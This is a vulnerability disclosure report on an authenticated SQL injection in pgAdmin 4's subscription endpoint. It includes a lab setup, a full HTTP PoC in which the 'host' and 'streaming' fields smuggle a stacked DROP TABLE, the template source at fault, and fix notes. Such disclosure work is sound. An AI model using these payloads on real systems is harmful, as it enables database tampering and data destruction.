### Vulnerability details

**Official website / Product:** https://www.pgadmin.org /

**Repository:** pgadmin-org/pgadmin4 (stars at selection: 3918)

**Vulnerability type:** SQLi

**Vulnerability versions:** 9.19.0 (Docker `dpage/pgadmin4:9.19.0`); sink present on tag `REL-9_18` (`f09776c22d9dc7c1130f01d416ee43c5db5f11cb`) and then-current `master` at audit time. Affects all `subscriptions/sql/*/create.sql` template variants (`default`, `15_plus`, `16_plus`, `17_plus`).

**Vulnerability URL / Parameter:** `POST /browser/subscription/obj/<gid>/<sid>/<did>/` → JSON field `host` (also `port` / `username` / `db` / `password` / SSL path fields in the same unescaped `CONNECTION '...'` template; block-comment closure relies on the same template’s `streaming` interpolation)

**Complex:** yes

### Verification procedure

1. Lab recreate (original `labs/pgadmin4-r35-a1/` was cleaned post-verify; rebuild the same topology). In any directory, write the compose below — image `dpage/pgadmin4:9.19.0` (host **21501→80**) + `postgres:16-alpine` (service name `db`, user/password/db `postgres`/`postgres`):

```yaml
# docker-compose.yml — VULN-0065 lab recreate
# Host: http://127.0.0.1:21501  |  images dpage/pgadmin4:9.19.0 + postgres:16-alpine
# Creds: admin@example.com / admin  |  DB: postgres/postgres@db:5432/postgres
services:
  pgadmin:
    image: dpage/pgadmin4:9.19.0
    ports:
      - "21501:80"
    environment:
      PGADMIN_DEFAULT_EMAIL: admin@example.com
      PGADMIN_DEFAULT_PASSWORD: admin
      PGADMIN_CONFIG_SERVER_MODE: "True"
      PGADMIN_CONFIG_MASTER_PASSWORD_REQUIRED: "False"
    depends_on:
      db:
        condition: service_healthy
    restart: unless-stopped

  db:
    image: postgres:16-alpine
    environment:
      POSTGRES_USER: postgres
      POSTGRES_PASSWORD: postgres
      POSTGRES_DB: postgres
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U postgres -d postgres"]
      interval: 5s
      timeout: 5s
      retries: 20
    restart: unless-stopped
```

```bash
docker compose up -d
# wait until http://127.0.0.1:21501/login returns 200
# default login: admin@example.com / admin
```

2. Log in and obtain session cookie / CSRF (**the `pga4_session` and `X-pgA-CSRFToken` values in the PoC below are lab-captured; replace them after recreate**):
   - Open `http://127.0.0.1:21501/login` and sign in as `admin@example.com` / `admin` (or `POST /authenticate/login`).
   - From the authenticated session, copy the `pga4_session` cookie and the CSRF value used by the UI into the `X-pgA-CSRFToken` request header (pgAdmin binds that header to the session).

3. In the object browser, register and connect a server: host=`db`, port=`5432`, maintenance DB=`postgres`, user/password=`postgres`/`postgres`. After connect, expand the database node; in this lab the `postgres` database is `did=5`, server `sid=1`, server group `gid=1` (path `/browser/subscription/obj/1/1/5/`). If IDs differ, use the browser node URLs.

4. Create the marker table and confirm it exists:

```bash
docker compose exec -T db \
  psql -U postgres -d postgres -c "CREATE TABLE r35a1_marker(id int); INSERT INTO r35a1_marker VALUES (42);"
docker compose exec -T db \
  psql -U postgres -d postgres -tAc "SELECT to_regclass('public.r35a1_marker');"
# expected: r35a1_marker
```

5. Authenticated `POST /browser/subscription/obj/1/1/5/` with JSON `host` breaking out of the `CONNECTION 'host=...'` literal via a single quote, completing a valid `CREATE SUBSCRIPTION ... PUBLICATION ... WITH (...)`, then stacking `DROP TABLE IF EXISTS r35a1_marker`, and opening a `/*` block comment; set `streaming` to `*/;--` in the same request to close the comment and swallow leftover template `WITH (... streaming = '...')` text so parsing does not fail.

6. Observe HTTP 200 with a subscription node whose `label` is `r35a1_evil_sub`; re-check the marker table — it should be gone:

```bash
docker compose exec -T db \
  psql -U postgres -d postgres -tAc "SELECT to_regclass('public.r35a1_marker');"
# expected: empty (table dropped by injected DROP TABLE)
docker compose exec -T db \
  psql -U postgres -d postgres -tAc "SELECT subname FROM pg_subscription WHERE subname='r35a1_evil_sub';"
# expected: r35a1_evil_sub
```

### Complete vulnerability PoC

Complete HTTP request (Docker-verified; refresh Cookie/CSRF per step 2 and confirm `gid/sid/did` per step 3 before replay):

```http
POST /browser/subscription/obj/1/1/5/ HTTP/1.1
Host: 127.0.0.1:21501
User-Agent: r35-a1-pgadmin-audit/1.0
Accept-Encoding: gzip, deflate, br, zstd
Accept: application/json
Connection: keep-alive
X-pgA-CSRFToken: IjQ2NjQ3ZWM5ODAxMzQzYWIxMWY1YTZlN2I3MzEzZDZjMDI0OTVlYWYi.aufxkQ.BqDiUp1xyoExgbKevcw9y8HYui6p65i9KnxpzSj57os
Content-Type: application/json
Referer: http://127.0.0.1:21501/browser/
Cookie: pga4_session=cb4df930-b489-4cd4-8d87-d18e1c0316ff!MRk3L+ARBjaCppxYJlWHIAZmtrAEhwJT4qdn0gIhTjY=; PGADMIN_LANGUAGE=en
Content-Length: 540

{"username":"postgres","name":"r35a1_evil_sub","connect":false,"copy_data":false,"create_slot":false,"db":"postgres","subowner":"postgres","enabled":false,"host":"x' PUBLICATION dummy_pub WITH (connect = false, enabled = false, create_slot = false, copy_data = false); DROP TABLE IF EXISTS r35a1_marker; /*","slot_name":null,"service":"","port":5432,"password":"ignored","sync":"off","binary":false,"two_phase":false,"disable_on_error":false,"streaming":"*/;--","password_required":true,"run_as_owner":false,"failover":false,"origin":"any"}
```

Critical injected fields (for readability):

- `host` = `x' PUBLICATION dummy_pub WITH (connect = false, enabled = false, create_slot = false, copy_data = false); DROP TABLE IF EXISTS r35a1_marker; /*`
- `streaming` = `*/;--` (closes the block comment opened in `host` and comments out the remainder of the template line)

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
Server: gunicorn
Date: Mon, 02 Nov 2026 02:12:33 GMT
Connection: keep-alive
Content-Type: application/json
Content-Length: 184
Vary: Accept-Encoding
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: default-src 'self' ws: http: data: blob:; script-src 'self' 'nonce-VYpfdtaerLvlkomXWsU_7g'; style-src 'self' 'unsafe-inline'; object-src 'none'; base-uri 'self';
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cross-Origin-Opener-Policy: same-origin
Set-Cookie: pga4_session=cb4df930-b489-4cd4-8d87-d18e1c0316ff!MRk3L+ARBjaCppxYJlWHIAZmtrAEhwJT4qdn0gIhTjY=; Expires=Tue, 03 Nov 2026 02:12:33 GMT; HttpOnly; Path=/; SameSite=Lax

{"node":{"_id":16406,"_pid":5,"_type":"subscription","icon":"icon-subscription","id":"subscription_16406","inode":false,"label":"r35a1_evil_sub","module":"pgadmin.node.subscription"}}
```

Verification result notes (lab-measured before/after):

```
BEFORE to_regclass(r35a1_marker)='r35a1_marker'
HTTP status=200
HTTP body={"node":{"_id":16406,"_pid":5,"_type":"subscription","icon":"icon-subscription","id":"subscription_16406","inode":false,"label":"r35a1_evil_sub","module":"pgadmin.node.subscription"}}

AFTER to_regclass(r35a1_marker)=''  (empty => table dropped by injected DROP TABLE)
pg_subscription has r35a1_evil_sub='r35a1_evil_sub'
```

- Before exploit: `to_regclass('public.r35a1_marker') = r35a1_marker`
- After exploit: `to_regclass('public.r35a1_marker')` is empty/NULL — marker table removed by the injected `DROP TABLE`
- Subscription `r35a1_evil_sub` exists in `pg_subscription` (first statement completed; second statement was the DROP)

### Vulnerability analysis

`SubscriptionView.create` loads the JSON body and renders a versioned Jinja SQL template, then executes the result with `conn.execute_dict(sql)` **without** parameters. The create template builds a libpq-style connection string by concatenating user fields directly inside a single-quoted SQL literal:

`CONNECTION 'host={{data.host}} port={{data.port}} user={{data.username}} ...'`

A `host` value containing a single quote closes that literal early. Because `execute_dict` issues the query with no bind parameters, psycopg3 uses the PostgreSQL **simple query protocol**, which permits multiple statements in one string. The PoC therefore:

1. Completes a valid `CREATE SUBSCRIPTION ... PUBLICATION ... WITH (connect=false, ...)`
2. Runs attacker SQL (`DROP TABLE IF EXISTS r35a1_marker`)
3. Opens a `/*` block comment and closes it via the later `streaming = '{{ data.streaming}}'` interpolation so leftover template `WITH (...)` text does not cause a parse failure

This is unexpected relative to the field’s intended meaning (publisher hostname). It is not the Query Tool / PSQL intentional arbitrary-SQL surface. Related secondary issues in the same templates: unquoted `slot_name = {{ data.slot_name }}` and other CONNECTION fields (`password`, SSL paths) are similarly unsanitized.

Trigger / sink source (full path and line numbers, relative to tag `REL-9_18`):

```python
# File: web/pgadmin/browser/server_groups/servers/databases/subscriptions/__init__.py
# Lines: 453-484 (create entry through first execute_dict)
def create(self, gid, sid, did):
    """
    This function will create the subscription object
    ...
    """
    required_args = [
        'name'
    ]

    data = request.form if request.form else json.loads(
        request.data
    )
    for arg in required_args:
        if arg not in data:
            return make_json_response(
                status=410,
                success=0,
                errormsg=gettext(
                    "Could not find the required parameter ({})."
                ).format(arg)
            )

    try:

        sql = render_template("/".join([self.template_path,
                                        self._CREATE_SQL]),
                              data=data, dummy=False, conn=self.conn)
        status, res = self.conn.execute_dict(sql)
```

```sql
# File: web/pgadmin/browser/server_groups/servers/databases/subscriptions/templates/subscriptions/sql/default/create.sql
# Lines: 14-16 (CONNECTION); line 24 (streaming interpolation). Same pattern in 15_plus / 16_plus / 17_plus create.sql.
CREATE SUBSCRIPTION {{ conn|qtIdent(data.name) }}
{% if data.host or data.port or data.username or data.password  or data.db or data.connect_timeout or data.passfile or data.sslmode or data.sslcompression or data.sslcert or data.sslkey or data.sslrootcert or data.sslcrl%}
    CONNECTION '{% if data.host %}host={{data.host}}{% endif %}{% if data.port %} port={{ data.port }}{% endif %}{% if data.username %} user={{ data.username }}{% endif %}{% if data.db %} dbname={{ data.db }}{% endif %}{% if data.connect_timeout %} connect_timeout={{ data.connect_timeout }}{% endif %}{% if data.passfile %} passfile={{ data.passfile }}{% endif %}{% if data.password %} {% if dummy %}password=xxxxxx{% else %}password={{ data.password}}{% endif %}{% endif %}{% if data.sslmode %} sslmode={{ data.sslmode }}{% endif %}{% if data.sslcompression %} sslcompression={{ data.sslcompression }}{% endif %}{% if data.sslcert %} sslcert={{ data.sslcert }}{% endif %}{% if data.sslkey %} sslkey={{ data.sslkey }}{% endif %}{% if data.sslrootcert %} sslrootcert={{ data.sslrootcert }}{% endif %}{% if data.sslcrl %} sslcrl={{ data.sslcrl }}{% endif %}'
{% endif %}
{% if data.pub %}
    PUBLICATION {% for pub in data.pub %}{% if loop.index != 1 %},{% endif %}{{ conn|qtIdent(pub) }}{% endfor %}
{% endif %}

    WITH ( ... binary = {{ data.binary|lower}}, streaming = '{{ data.streaming}}');
```

(The PoC omits `pub`, so the template skips the `PUBLICATION` segment; the attacker supplies `PUBLICATION dummy_pub WITH (...)` after breaking out of `host`. The `streaming` interpolation sits at the end of the same `WITH` clause and is used to close the block comment.)

### Fix notes

- Escape every CONNECTION string fragment with a dedicated literal escaper (escape `\` and `'` for the SQL string, and reject/encode libpq meta-characters as needed), or build the connection string in Python with `psycopg.sql.Literal` / proper quoting before embedding.
- Prefer parameterized APIs where possible; if a full DDL string must be executed, force extended-query / single-statement execution (`prepare=True`) so stacked queries cannot run.
- Apply the same hardening to `slot_name` / `streaming` and other raw interpolations in the WITH clause; add regression tests that assert `'` in `host` cannot terminate the CONNECTION literal.
